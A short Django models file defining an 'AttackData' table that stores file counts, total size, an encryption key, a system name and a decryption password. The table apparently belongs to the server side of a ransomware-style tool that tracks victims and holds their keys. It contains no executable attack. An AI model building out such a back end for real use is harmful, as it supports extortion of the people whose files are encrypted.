from django.db import models

class AttackData(models.Model):
    NumberOfFiles = models.IntegerField()
    TotalFilesSize = models.IntegerField()
    EncryptionKey = models.BinaryField(max_length=100)
    SystemName = models.CharField(max_length=100)
    DecryptionPassword = models.CharField(max_length=100)

